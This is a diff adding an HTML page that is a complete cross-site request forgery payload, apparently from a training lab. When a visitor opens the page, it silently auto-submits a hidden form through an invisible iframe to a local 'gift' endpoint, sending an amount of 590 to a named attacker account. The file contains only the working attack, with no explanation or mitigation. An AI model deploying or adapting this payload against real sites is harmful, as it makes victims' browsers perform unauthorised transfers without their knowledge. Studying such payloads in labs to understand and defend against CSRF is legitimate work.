@@ -1,0 +1,13 @@
+<html>
+	<head>
+		<title>CSRF is dangerous</title>
+	</head>
+	<body onload="document.freefood.submit()">
+		<h1>Thanks for helping me eat for free</h1>
+		<form action="http://127.0.0.1:8000/gift/2" method="post" target="iframevuln" name="freefood">
+			<input type="hidden" name="username" value="zerocool@hackers.com" />
+			<input type="hidden" name="amount" value="590" />
+		</form>
+		<iframe name="iframevuln" style="display: none;"></iframe>
+	</body>
+</html>
